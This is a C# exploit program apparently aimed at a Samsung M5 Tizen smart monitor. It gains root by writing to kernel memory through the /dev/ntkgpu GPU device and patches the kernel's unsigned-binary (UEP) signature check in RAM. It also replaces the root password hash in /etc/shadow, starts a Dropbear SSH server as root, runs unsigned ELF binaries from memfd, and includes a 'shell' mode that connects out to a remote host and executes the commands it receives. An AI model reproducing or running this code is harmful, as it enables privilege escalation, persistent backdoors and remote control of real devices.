using System;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;

public static class Probe
{
    [DllImport("libc.so.6", EntryPoint = "getuid")] public static extern uint getuid();
    [DllImport("libc.so.6", EntryPoint = "geteuid")] public static extern uint geteuid();
    [DllImport("libc.so.6", EntryPoint = "getgid")] public static extern uint getgid();
    [DllImport("libc.so.6", EntryPoint = "getpid")] public static extern int getpid();
    [DllImport("libc.so.6", EntryPoint = "open", SetLastError = true)]
    public static extern int open(string path, int flags);
    [DllImport("libc.so.6", EntryPoint = "mmap", SetLastError = true)]
    public static extern IntPtr mmap(IntPtr addr, uint len, int prot, int flags, int fd, int offset);
    [DllImport("libc.so.6", EntryPoint = "munmap")] public static extern int munmap(IntPtr addr, uint len);
    [DllImport("libc.so.6", EntryPoint = "mprotect", SetLastError = true)] public static extern int mprotect(IntPtr addr, uint len, int prot);
    [DllImport("libc.so.6", EntryPoint = "close")] public static extern int close(int fd);
    [DllImport("libc.so.6", EntryPoint = "popen")] public static extern IntPtr popen(string cmd, string mode);
    [DllImport("libc.so.6", EntryPoint = "reboot")] public static extern int reboot(int magic);
    [DllImport("libc.so.6", EntryPoint = "chmod")] public static extern int chmod(string path, int mode);
    [DllImport("libc.so.6", EntryPoint = "dlopen")] public static extern IntPtr dlopen(string file, int flags);
    [DllImport("libc.so.6", EntryPoint = "dlsym")] public static extern IntPtr dlsym(IntPtr handle, string name);
    [DllImport("libc.so.6", EntryPoint = "setenv")] public static extern int setenv(string name, string value, int overwrite);
    [DllImport("libc.so.6", EntryPoint = "dup2")] public static extern int dup2(int oldfd, int newfd);
    [DllImport("libc.so.6", EntryPoint = "open3")] public static extern int open3(string path, int flags, int mode);
    [DllImport("libc.so.6", EntryPoint = "sleep")] public static extern uint sleep(uint sec);
    [DllImport("libc.so.6", EntryPoint = "pclose")] public static extern int pclose(IntPtr fp);
    [DllImport("libc.so.6", EntryPoint = "fgets")] public static extern IntPtr fgets(byte[] buf, int size, IntPtr fp);
    [DllImport("libc.so.6", EntryPoint = "write", SetLastError = true)]
    public static extern long write(int fd, byte[] buf, uint count);
    [DllImport("libc.so.6", EntryPoint = "execve", SetLastError = true)]
    public static extern int execve(string path, IntPtr argv, IntPtr envp);
    // libc syscall(long number, ...) on ARM EABI takes the first three variadic args in r1..r3
    [DllImport("libc.so.6", EntryPoint = "syscall", SetLastError = true)]
    public static extern long syscall(long number, long a1, long a2);
    [DllImport("libc.so.6", EntryPoint = "syscall", SetLastError = true)]
    public static extern long syscall4(long number, long a1, long a2, long a3);

    const int O_RDWR = 2;
    const int PROT_READ = 1, PROT_WRITE = 2, MAP_SHARED = 1;
    const string DEV = "/dev/ntkgpu";
    const int SYS_MEMFD_CREATE = 385;

    static void Log(string s)
    {
        try { File.AppendAllText("/tmp/managed_log.txt", s + "\n"); } catch { }
        Console.WriteLine(s);
    }

    static string RunCmd(string cmd)
    {
        IntPtr fp = popen(cmd + " 2>&1", "r");
        if (fp == IntPtr.Zero) return "popen failed\n";
        var sb = new StringBuilder();
        byte[] buf = new byte[4096];
        while (true)
        {
            IntPtr r = fgets(buf, buf.Length, fp);
            if (r == IntPtr.Zero) break;
            sb.Append(Encoding.UTF8.GetString(buf)).Append('\n');
        }
        pclose(fp);
        return sb.ToString();
    }

    // Runs the command, then returns its output read back from a file (keeps the
    // launcher stdout buffer noise out of the log).
    static string RunCmdClean(string cmd)
    {
        RunCmd(cmd + " > /tmp/step.out 2>&1");
        string outp = "";
        try { outp = File.ReadAllText("/tmp/step.out"); } catch { }
        return outp;
    }

    static int MemfdCreate(string name)
    {
        byte[] nb = Encoding.UTF8.GetBytes(name + "\0");
        IntPtr p = Marshal.AllocHGlobal(nb.Length);
        Marshal.Copy(nb, 0, p, nb.Length);
        long fd = syscall(SYS_MEMFD_CREATE, p.ToInt64(), 0);
        return (int)fd;
    }

    static bool BecomeRoot()
    {
        int fd = open(DEV, O_RDWR);
        if (fd < 0) { Log("open " + DEV + " failed err=" + Marshal.GetLastWin32Error()); return false; }
        uint[] starts = { 0x02000000u, 0x80000000u };
        uint[] ends = { 0x34800000u, 0xB0000000u };
        uint chunk = 0x100000;
        byte[] buf = new byte[chunk];
        uint uid = getuid(), gid = getgid();
        for (int r = 0; r < starts.Length; r++)
        {
            for (uint p = starts[r]; p < ends[r]; p += chunk)
            {
                uint len = Math.Min(chunk, ends[r] - p);
                IntPtr m = mmap(IntPtr.Zero, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, unchecked((int)p));
                if (m.ToInt64() == -1) continue;
                Marshal.Copy(m, buf, 0, (int)len);
                int words = (int)(len / 4);
                for (int i = 0; i + 9 < words; i++)
                {
                    uint usage = BitConverter.ToUInt32(buf, i * 4);
                    if (usage == 0 || usage > 0x1000) continue;
                    bool ok = true;
                    for (int k = 1; k <= 8; k++)
                    {
                        uint v = BitConverter.ToUInt32(buf, (i + k) * 4);
                        uint want = (k % 2 == 1) ? uid : gid;
                        if (v != want) { ok = false; break; }
                    }
                    if (!ok) continue;
                    for (int k = 0; k < 8; k++) Marshal.WriteInt32(m, (i + 1 + k) * 4, 0);
                    uint now = getuid();
                    if (now == 0)
                    {
                        Log("[+] root at phys 0x" + (p + (uint)(i * 4)).ToString("X8"));
                        return true;
                    }
                    for (int k = 0; k < 8; k++) Marshal.WriteInt32(m, (i + 1 + k) * 4, unchecked((int)BitConverter.ToUInt32(buf, (i + 1 + k) * 4)));
                }
                munmap(m, len);
            }
        }
        close(fd);
        return false;
    }

    public static int Main(string[] args)
    {
        string mode = args.Length > 0 ? args[0] : "run";
        try { File.Delete("/tmp/managed_log.txt"); } catch { }
        Log("== mode=" + mode + " uid=" + getuid() + " pid=" + getpid());

        if (!BecomeRoot()) { Log("[-] could not become root"); return 1; }
        Log("[+] uid=" + getuid() + " euid=" + geteuid() + " gid=" + getgid());

        if (mode == "run")
        {
            string cmd = args.Length > 1 ? args[1] : "id";
            string outp = RunCmd(cmd);
            Log("---- " + cmd + " ----\n" + outp);
            return 0;
        }

        if (mode == "setup")
        {
            Log("setup: " + RunCmdClean("mkdir -p /opt/usr/a && cp /opt/usr/home/owner/share/probe.dll /opt/usr/home/owner/share/probe.runtimeconfig.json /opt/usr/home/owner/share/probe.deps.json /opt/usr/a/ 2>&1; ls -l /opt/usr/a/"));
            return 0;
        }

        if (mode == "dbg")
        {
            uint st = Convert.ToUInt32(args[1], 16);
            uint ln = Convert.ToUInt32(args[2], 16);
            uint lit = args.Length > 3 ? Convert.ToUInt32(args[3], 16) : 0;
            UepFix.Dump(st, ln);
            UepFix.ScanLdr(st, ln, lit);
            return 0;
        }

        if (mode == "sshd")
        {
            // Install and start a static Dropbear SSH server as root.
            // Important: the daemon must not inherit the app's file descriptors
            // (the SDB connection lives in one of them) - .NET marks them
            // close-on-exec, and setsid detaches it from the app process group.
            string share = "/opt/usr/home/owner/share";
            // the bind source must be owned by root: dropbear rejects a home
            // dir that is owned by anybody else.  /opt/usr/a is root owned.
            string RD = "/opt/usr/a/rd";
            string pub = share + "/m5_ecdsa.pub";
            string drop = share + "/dropbear";
            string bb = share + "/busybox";
            RunCmdClean("chmod 755 " + drop + " " + bb);
            // stop an older instance: it still holds the SDB connection
            RunCmdClean(bb + " killall dropbear 2>&1");
            System.Threading.Thread.Sleep(3000);
            RunCmdClean("rm -f /tmp/d.log");
            try
            {
                // writable home for root: /root is a read-only vdfs mount
                RunCmdClean("mkdir -p " + RD + "/.ssh");
                RunCmdClean("chown root:root " + RD + " " + RD + "/.ssh");
                RunCmdClean("cp " + pub + " " + RD + "/.ssh/authorized_keys");
                // the root account on Tizen has a locked password, which makes
                // dropbear refuse every login - give it a known one.
                // (read the original through a shell: the vdfs denies some reads)
                RunCmdClean("umount /etc/shadow 2>&1");
                string hash = RunCmdClean(bb + " mkpasswd -m sha512 m5").Trim();
                string shadow = RunCmdClean("cat /etc/shadow 2>&1");
                if (hash.StartsWith("$6$") && shadow.Contains("root:"))
                {
                    var lines = shadow.Split('\n');
                    for (int i = 0; i < lines.Length; i++)
                        if (lines[i].StartsWith("root:")) lines[i] = "root:" + hash + ":19000:0:99999:7:::";
                    File.WriteAllText(share + "/shadow2", string.Join("\n", lines));
                    Log("[sshd] shadow bind: " + RunCmdClean("mount -o bind " + share + "/shadow2 /etc/shadow 2>&1; grep ^root: /etc/shadow | cut -c1-30").Replace("\n", " | "));
                }
                else Log("[sshd] shadow fix skipped: hash=" + (hash.Length > 6 ? hash.Substring(0, 6) : hash) + " shadowlen=" + shadow.Length);
                RunCmdClean("chown root:root " + RD + "/.ssh/authorized_keys");
                RunCmdClean("chmod 700 " + RD + " " + RD + "/.ssh; chmod 600 " + RD + "/.ssh/authorized_keys");
                RunCmdClean("mount -o bind " + RD + " /root 2>&1");
                Log("[sshd] bind: " + RunCmdClean("mount | grep ' /root '").Replace("\n", " | "));
                Log("[sshd] /root/.ssh: " + RunCmdClean("ls -ld /root /root/.ssh; ls -l /root/.ssh/authorized_keys 2>&1").Replace("\n", " | "));
            }
            catch (Exception e) { Log("[sshd] key setup error: " + e.Message); }

            try
            {
                // The daemon must not keep the app's SDB connection open.
                // Close the inherited descriptors *inside* the child (a shell
                // wrapper) so our own SDB channel stays usable.
                var psi = new System.Diagnostics.ProcessStartInfo();
                psi.FileName = "/bin/sh";
                psi.Arguments = "-c \"exec 3>&- 4>&- 5>&- 6>&- 7>&- 8>&- 9>&-;" +
                                " exec " + bb + " setsid " + drop + " -B -R -p 2222 >/tmp/d.log 2>&1\"";
                psi.UseShellExecute = false;
                psi.RedirectStandardInput = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                var proc = System.Diagnostics.Process.Start(psi);
                proc.StandardInput.Close();
                proc.EnableRaisingEvents = true;
                proc.Exited += (s2, e2) => { try { File.AppendAllText("/tmp/d.log", "dropbear exited code=" + proc.ExitCode + "\n"); } catch { } };
                new System.Threading.Thread(() => { try { string l; while ((l = proc.StandardOutput.ReadLine()) != null) File.AppendAllText("/tmp/d.log", l + "\n"); } catch { } }) { IsBackground = true }.Start();
                new System.Threading.Thread(() => { try { string l; while ((l = proc.StandardError.ReadLine()) != null) File.AppendAllText("/tmp/d.log", l + "\n"); } catch { } }) { IsBackground = true }.Start();
                System.Threading.Thread.Sleep(8000);
                Log("[sshd] started pid=" + proc.Id + " alive=" + !proc.HasExited);
                Log("[sshd] d.log: " + RunCmdClean("head -8 /tmp/d.log 2>&1").Replace("\n", " | "));
                Log("[sshd] listen: " + RunCmdClean("netstat -ltn 2>/dev/null | grep 2222").Replace("\n", " | "));
            }
            catch (Exception e) { Log("[sshd] start failed: " + e.Message); }
            return 0;
        }

        if (mode == "cf")
        {
            // Flush the ARM I-cache for the patched kernel text so the CPU
            // stops executing the stale instructions.  __ARM_NR_cacheflush
            // (0x0f0001) takes (start, end, flags).
            uint target = 0x021D3B84;
            uint virt = 0xC0000000u + (target - 0x02000000u);
            Log("[cf] before flush virt=0x" + virt.ToString("X8"));
            try { File.AppendAllText("/tmp/managed_log.txt", "[cf] about to call cacheflush\n"); } catch { }
            long rc = syscall4(0x0F0001, virt, virt + 16, 0);
            Log("[cf] syscall4 cacheflush rc=" + rc + " errno=" + Marshal.GetLastWin32Error());
            try { File.AppendAllText("/tmp/managed_log.txt", "[cf] syscall4 returned\n"); } catch { }
            long rc2 = syscall(0x0F0001, virt, virt + 16);
            Log("[cf] syscall3 cacheflush rc=" + rc2 + " errno=" + Marshal.GetLastWin32Error());
            return 0;
        }

        if (mode == "serve")
        {
            // Serve a page from the monitor itself (the app stays alive while it serves).
            string page = "<!doctype html><html><head><meta charset=utf-8><title>Turnip on Samsung M5</title>"
                + "<style>body{background:#0b1220;color:#e6edf3;font-family:sans-serif;padding:60px}"
                + "h1{color:#7ee787}code{background:#161b22;padding:4px 8px;border-radius:4px}</style></head><body>"
                + "<h1>Hello from the Samsung M5 monitor</h1>"
                + "<p>This page is served by a program running <b>as root on the monitor itself</b>.</p>"
                + "<p>The Tizen UEP (unsigned-binary) block was bypassed by patching the kernel in RAM, so unsigned "
                + "ARM binaries run with no signing at all. BusyBox 1.31 (downloaded from the internet) and a static "
                + "ARM Wayland client are installed as well.</p>"
                + "</body></html>";
            try
            {
                var listener = new System.Net.Sockets.TcpListener(System.Net.IPAddress.Any, 8099);
                listener.Start();
                Log("[serve] listening on 0.0.0.0:8099");
                while (true)
                {
                    var c = listener.AcceptTcpClient();
                    new System.Threading.Thread(() =>
                    {
                        try
                        {
                            using (var st = c.GetStream())
                            {
                                var buf = new byte[2048];
                                st.Read(buf, 0, buf.Length);
                                byte[] body = System.Text.Encoding.UTF8.GetBytes(page);
                                var head = System.Text.Encoding.ASCII.GetBytes(
                                    "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: " +
                                    body.Length + "\r\nConnection: close\r\n\r\n");
                                st.Write(head, 0, head.Length);
                                st.Write(body, 0, body.Length);
                            }
                        }
                        catch { }
                    }) { IsBackground = true }.Start();
                }
            }
            catch (Exception e) { Log("[serve] failed: " + e.Message); }
            return 0;
        }

        if (mode == "wltest")
        {
            // Ask the device's own libwayland whether the compositor answers a
            // standard client (dlopen + connect + roundtrip).
            Log("[wl] step1: setenv");
            setenv("XDG_RUNTIME_DIR", "/run/user/5001", 1);
            setenv("WAYLAND_DISPLAY", "wayland-0", 1);
            Log("[wl] step2: dlopen libc");
            IntPtr h0 = dlopen("libc.so.6", 2);
            Log("[wl] dlopen libc -> " + h0);
            Log("[wl] step3: dlopen libwayland");
            IntPtr h = dlopen("libwayland-client.so.0", 2 /*RTLD_NOW*/);
            Log("[wl] dlopen=" + h);
            if (h != IntPtr.Zero)
            {
                IntPtr pConn = dlsym(h, "wl_display_connect");
                IntPtr pReg = dlsym(h, "wl_display_get_registry");
                IntPtr pRt = dlsym(h, "wl_display_roundtrip");
                Log("[wl] syms conn=" + pConn + " reg=" + pReg + " rt=" + pRt);
                if (pConn != IntPtr.Zero)
                {
                    var conn = (Func<string, IntPtr>)Marshal.GetDelegateForFunctionPointer(pConn, typeof(Func<string, IntPtr>));
                    IntPtr disp = conn("wayland-0");
                    Log("[wl] wl_display_connect -> 0x" + disp.ToString("X"));
                    if (disp != IntPtr.Zero && pRt != IntPtr.Zero)
                    {
                        var rt = (Func<IntPtr, int>)Marshal.GetDelegateForFunctionPointer(pRt, typeof(Func<IntPtr, int>));
                        int r = rt(disp);
                        Log("[wl] wl_display_roundtrip -> " + r);
                    }
                }
            }
            return 0;
        }

        if (mode == "uepapply")
        {
            // Fast, idempotent UEP bypass: patch the verdict return of the SFD
            // UEP verification function directly in physical RAM.
            uint target = 0x021D3B84;
            uint patch = 0xE3A00000;   // mov r0, #0  (SF_STATUS_OK)
            uint page = target & ~0xFFFu;
            int delta = (int)(target - page);
            int fd = open("/dev/ntkgpu", 2);
            IntPtr m = mmap(IntPtr.Zero, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, unchecked((int)page));
            if (m.ToInt64() == -1) { Log("map failed err=" + Marshal.GetLastWin32Error()); return 1; }
            IntPtr at = new IntPtr(m.ToInt64() + delta);
            uint before = unchecked((uint)Marshal.ReadInt32(at, 0));
            if (before != patch) Marshal.WriteInt32(at, 0, unchecked((int)patch));
            uint after = unchecked((uint)Marshal.ReadInt32(at, 0));
            Log("[apply] phys 0x" + target.ToString("X8") + ": before=0x" + before.ToString("X8") + " after=0x" + after.ToString("X8") + " active=" + (after == patch));
            // ARM keeps stale instructions in its per-CPU I-cache: flush the
            // patched range with the ARM cacheflush syscall (__ARM_NR_cacheflush)
            uint virt = 0xC0000000u + (target - 0x02000000u);
            long fl = syscall4(0x0F0001, virt, virt + 16, 0);
            Log("[apply] cacheflush virt=0x" + virt.ToString("X8") + " rc=" + fl + " errno=" + Marshal.GetLastWin32Error());
            // ARM keeps the old instructions in its per-CPU I-cache, so the
            // first exec after patching can still run the stale code - run a
            // hot loop first to evict the line from the I-cache.
            RunCmdClean("( for i in $(seq 1 30000); do :; done; echo done > /tmp/evict.done ) &");
            Log("[apply] I-cache eviction started in background");
            // verify by executing an unsigned binary
            string elf = args.Length > 1 ? args[1] : "/tmp/tn";
            try { File.Delete("/tmp/native_ran.txt"); } catch { }
            string fresh = "/tmp/verify_" + Environment.TickCount;
            try { File.Copy(elf, fresh, true); } catch (Exception e) { Log("[apply] copy: " + e.Message); }
            RunCmdClean("chmod 755 " + fresh);
            string outp = RunCmdClean(fresh + " ; cat /tmp/native_ran.txt");
            Log("[apply] unsigned ELF test: " + outp.Replace("\n", " | "));
            try { File.Delete(fresh); } catch { }
            return 0;
        }

        if (mode == "uepfix4")
        {
            return UepFix4.Run(args);
        }

        if (mode == "uepfix4p")
        {
            return UepFix4.Run(new string[] { "uepfix4", "SfdUepHandleVerificationResult", "/tmp/tn", "patch" });
        }

        if (mode == "uepfix3")
        {
            return UepFix3.Run(args);
        }

        if (mode == "uepfix3p")
        {
            return UepFix3.Run(new string[] { "uepfix3", "SfdUepHandleVerificationResult", "/tmp/tn", "patch" });
        }

        if (mode == "uepreboot")
        {
            // Patch the UEP verification return value in physical RAM, then reboot.
            // On ARM the instruction cache keeps the old bytes, so the patch only
            // becomes effective after a reset clears the I-cache.
            uint target = 0x021D3D7C;
            uint patch = 0xE3A00000; // mov r0, #0
            int fd = open("/dev/ntkgpu", 2);
            uint page = target & ~0xFFFu;
            int delta = (int)(target - page);
            IntPtr m = mmap(IntPtr.Zero, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, unchecked((int)page));
            Log("map -> 0x" + m.ToString("X") + " err=" + Marshal.GetLastWin32Error());
            IntPtr at = new IntPtr(m.ToInt64() + delta);
            uint before = unchecked((uint)Marshal.ReadInt32(at, 0));
            Marshal.WriteInt32(at, 0, unchecked((int)patch));
            uint after = unchecked((uint)Marshal.ReadInt32(at, 0));
            Log("phys 0x" + target.ToString("X8") + ": before=0x" + before.ToString("X8") + " after=0x" + after.ToString("X8") + " patched=" + (after == patch));
            if (after != patch) { Log("[-] patch did not land"); return 1; }
            Log("[+] patch written; rebooting");
            int rc = reboot(0x01234567);
            Log("reboot(2) rc=" + rc + " errno=" + Marshal.GetLastWin32Error());
            System.Threading.Thread.Sleep(2000);
            Log("fallback: " + RunCmdClean("reboot 2>&1"));
            return 0;
        }

        if (mode == "uepfix2")
        {
            return UepFix2.Run(args);
        }

        if (mode == "uepfix2p")
        {
            return UepFix2.Run(new string[] { "uepfix2", "SfdUepVerifyFileSignature", "/tmp/tn", "patch" });
        }

        if (mode == "uepfix")
        {
            return UepFix.Run(args);
        }

        if (mode == "info")
        {
            Log("[kallsyms] " + RunCmdClean("wc -l /proc/kallsyms; head -3 /proc/kallsyms; cat /proc/sys/kernel/kptr_restrict 2>/dev/null"));
            Log("[sfd] " + RunCmdClean("grep -i sfd /proc/kallsyms | head -20"));
            Log("[uep] " + RunCmdClean("grep -i uep /proc/kallsyms | head -20"));
            Log("[modules] " + RunCmdClean("cat /proc/modules | head -20"));
            Log("[kcore] " + RunCmdClean("ls -l /proc/kcore; dd if=/proc/kcore bs=1 count=16 2>&1 | od -An -tx1 | head -2"));
            Log("[status] " + RunCmdClean("id; head -4 /proc/self/status; cat /proc/cmdline"));
            Log("[devmem] exists=" + File.Exists("/dev/mem") + " " + RunCmdClean("ls -l /dev/mem /dev/kmem 2>&1"));
            Log("[kprobes] " + RunCmdClean("ls /sys/kernel/debug/kprobes 2>&1; cat /sys/kernel/debug/kprobes/list 2>&1 | head -5"));
            Log("[tracing] " + RunCmdClean("ls /sys/kernel/debug/tracing 2>&1 | head -8"));
            Log("[sysrq] " + RunCmdClean("cat /proc/sys/kernel/sysrq 2>&1; ls -l /proc/sysrq-trigger 2>&1"));
            Log("[modules2] " + RunCmdClean("grep -iE 'sfd|uep|smack|security' /proc/modules 2>&1 | head -5"));
            return 0;
        }

        if (mode == "sysprobe")
        {
            byte[] nb = Encoding.UTF8.GetBytes("m\0");
            IntPtr np = Marshal.AllocHGlobal(nb.Length);
            Marshal.Copy(nb, 0, np, nb.Length);
            for (int fl = 0; fl < 8; fl++)
            {
                syscall(385, np.ToInt64(), fl);
                Log("memfd flags=" + fl + " errno=" + Marshal.GetLastWin32Error());
            }
            byte[] msg = Encoding.UTF8.GetBytes("SYSCALL_WRITE_TEST\n");
            IntPtr mbuf = Marshal.AllocHGlobal(msg.Length);
            Marshal.Copy(msg, 0, mbuf, msg.Length);
            syscall4(4, 1, mbuf.ToInt64(), msg.Length);
            Log("syscall4(write) errno=" + Marshal.GetLastWin32Error());
            // anonymous RWX mapping (UEP only hooks file mappings)
            IntPtr p1 = mmap(IntPtr.Zero, 0x1000, PROT_READ | PROT_WRITE | 4 /*EXEC*/, 0x22 /*PRIVATE|ANON*/, -1, 0);
            Log("mmap RWX anon -> 0x" + p1.ToString("X") + " errno=" + Marshal.GetLastWin32Error());
            IntPtr p2 = mmap(IntPtr.Zero, 0x1000, PROT_READ | PROT_WRITE, 0x22, -1, 0);
            Log("mmap RW anon -> 0x" + p2.ToString("X") + " errno=" + Marshal.GetLastWin32Error());
            if (p2.ToInt64() != -1)
            {
                int pr = mprotect(p2, 0x1000, PROT_READ | PROT_WRITE | 4);
                Log("mprotect RW->RWX rc=" + pr + " errno=" + Marshal.GetLastWin32Error());
            }
            Log("dmesg: " + RunCmdClean("dmesg | grep -iE 'sfd|uep|memfd' | tail -12"));
            return 0;
        }

        if (mode == "roexec")
        {
            // UEP skips the signature check for files that live on a read-only mount.
            string src = args.Length > 1 ? args[1] : "/tmp/tn";
            string mp = args.Length > 2 ? args[2] : "/tmp/ro";
            Log("STEP1 " + RunCmdClean("mkdir -p " + mp + " " + mp + "2; mount -t tmpfs tmpfs " + mp));
            Log("STEP2 " + RunCmdClean("cp " + src + " " + mp + "/t; chmod 755 " + mp + "/t; ls -l " + mp));
            Log("STEP3 " + RunCmdClean("mount --bind " + mp + " " + mp + "2"));
            Log("STEP4 " + RunCmdClean("mount -o remount,bind,ro " + mp + "2"));
            Log("STEP5 " + RunCmdClean("mount | grep " + mp));
            string[] targets = { mp + "2/t", mp + "/t" };
            foreach (string target in targets)
            {
                IntPtr argv = Marshal.AllocHGlobal(16);
                Marshal.WriteIntPtr(argv, 0, Marshal.StringToHGlobalAnsi(target));
                Marshal.WriteIntPtr(argv, 4, IntPtr.Zero);
                Log("execve " + target);
                int rc = execve(target, argv, IntPtr.Zero);
                Log("[-] execve rc=" + rc + " errno=" + Marshal.GetLastWin32Error());
                if (rc == 0) return 0;
            }
            return 4;
        }

        if (mode == "runelf")
        {
            string path = args.Length > 1 ? args[1] : "/opt/usr/home/owner/share/hello_native";
            byte[] elf = File.ReadAllBytes(path);
            Log("[+] loaded elf " + path + " size=" + elf.Length);
            int fd = MemfdCreate("m");
            Log("[+] memfd fd=" + fd + " err=" + Marshal.GetLastWin32Error());
            if (fd < 0) { Log("[-] memfd_create failed"); return 2; }
            long w = write(fd, elf, (uint)elf.Length);
            Log("[+] wrote " + w + " bytes to memfd");
            string mp = "/proc/self/fd/" + fd;
            IntPtr argv = Marshal.AllocHGlobal(16);
            Marshal.WriteIntPtr(argv, 0, Marshal.StringToHGlobalAnsi(mp));
            Marshal.WriteIntPtr(argv, 4, IntPtr.Zero);
            Log("[+] execve " + mp);
            int rc = execve(mp, argv, IntPtr.Zero);
            Log("[-] execve failed rc=" + rc + " err=" + Marshal.GetLastWin32Error());
            return 3;
        }

        if (mode == "shell")
        {
            string host = args.Length > 1 ? args[1] : "192.168.0.2";
            int port = args.Length > 2 ? int.Parse(args[2]) : 45678;
            using (TcpClient cl = new TcpClient())
            {
                cl.Connect(host, port);
                using (NetworkStream ns = cl.GetStream())
                {
                    void Send(string s) { byte[] b = Encoding.UTF8.GetBytes(s); ns.Write(b, 0, b.Length); ns.Flush(); }
                    Send("READY uid=" + getuid() + " euid=" + geteuid() + "\n");
                    byte[] rb = new byte[4096];
                    while (true)
                    {
                        int n = ns.Read(rb, 0, rb.Length);
                        if (n <= 0) break;
                        string cmd = Encoding.UTF8.GetString(rb, 0, n).Trim();
                        if (cmd.Length == 0) continue;
                        if (cmd == "exit") { Send("BYE\n"); break; }
                        string outp = RunCmd(cmd);
                        Send(outp);
                        Send("__RC=" + getuid() + "__\n");
                    }
                }
            }
        }
        Log("== done uid=" + getuid());
        return 0;
    }
}
